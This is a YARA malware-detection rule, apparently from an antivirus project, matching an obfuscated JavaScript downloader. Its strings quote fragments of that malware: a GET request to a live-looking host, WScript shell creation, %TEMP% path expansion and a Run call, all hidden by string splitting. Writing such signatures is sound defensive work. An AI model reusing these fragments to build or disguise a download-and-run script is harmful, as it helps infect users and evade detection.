rule sig_20160428_5da46c4ddea2be5b1a025c905d5fee2e {
  meta:
    description = "datamaliciousorder - file 20160428_5da46c4ddea2be5b1a025c905d5fee2e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "20ad8ecd1796cfb51cdf0bc06e32ac150b79fc33be20a334af4453825fda9ff9"

  strings:
    $s1  = "RlhKlmFabVprFcmNwsRax[OejLxcNjrTruZtwPqrXpy](\"G\" + \"ET\", \"http://rabitaforex.com/pw3ksl\", false);" fullword ascii
    $s2  = "function QcdGneZwsMbcKokTolDir(NxsRlgGucWrwIkmBmgJsx){NlmOaqMjlRhwCliJqgKoa[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function NegVudWpeDjjPsmDbxIxw() {return NlmOaqMjlRhwCliJqgKoa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function QcdGneZwsMbcKokTolDir(NxsRlgGucWrwIkmBmgJsx){NlmOaqMjlRhwCliJqgKoa[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var NlmOaqMjlRhwCliJqgKoa = function VhbJmiVqkZcoHvvBwoCmp() {return ZiaYrkZalMhhLqwKwoIee[VhwDztMjtLcrKvpJzmRpu](\"WScript\"+\"" ascii
    $s6  = "return VjzQgxZgxHgpQpwLwqKex - AgaMbcFvkApdPtyQuxMtw;};" fullword ascii
    $s7  = "function RevCkeIumOhlIlpCcwRwj(VjzQgxZgxHgpQpwLwqKex, AgaMbcFvkApdPtyQuxMtw){GvhDtfWnoPruHqfJgiXqq = GvhDtfWnoPruHqfJgiXqq * 1; " ascii
    $s8  = "var ZiaYrkZalMhhLqwKwoIee = this[\"WScript\"];" fullword ascii
    $s9  = "var NlmOaqMjlRhwCliJqgKoa = function VhbJmiVqkZcoHvvBwoCmp() {return ZiaYrkZalMhhLqwKwoIee[VhwDztMjtLcrKvpJzmRpu](\"WScript\"+\"" ascii
    $s10 = "function NegVudWpeDjjPsmDbxIxw() {return NlmOaqMjlRhwCliJqgKoa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function LhvGhdXdkHabCekEfuGcy(){return ZdlAoxNriAimGchApjXig + \"\";};" fullword ascii
    $s12 = "function RevCkeIumOhlIlpCcwRwj(VjzQgxZgxHgpQpwLwqKex, AgaMbcFvkApdPtyQuxMtw){GvhDtfWnoPruHqfJgiXqq = GvhDtfWnoPruHqfJgiXqq * 1; " ascii
    $s13 = "if (RlhKlmFabVprFcmNwsRax[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function TkoSqsPhcYqoUrrSwdXii() {return ((HqcUqyUooJvyDbcMaiLnb == true) && (HqcUqyUooJvyDbcMaiLnb == NsnIxsLpfLmpWzzUqjXpj)) ?" ascii
    $s15 = "function TkoSqsPhcYqoUrrSwdXii() {return ((HqcUqyUooJvyDbcMaiLnb == true) && (HqcUqyUooJvyDbcMaiLnb == NsnIxsLpfLmpWzzUqjXpj)) ?" ascii
    $s16 = "NsnIxsLpfLmpWzzUqjXpj = true; " fullword ascii
    $s17 = "var HqcUqyUooJvyDbcMaiLnb = false;" fullword ascii
    $s18 = "return RevCkeIumOhlIlpCcwRwj(1 == 1 ? AnoExoLdwPbaPocIjyCmw : 0, 1 == 1 ? UhvNsyTjgMyeYqfMecUap : 0);" fullword ascii
    $s19 = "var NsnIxsLpfLmpWzzUqjXpj = false;" fullword ascii
    $s20 = "var QcdDjkLpdQjaHnmRrvYvi = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}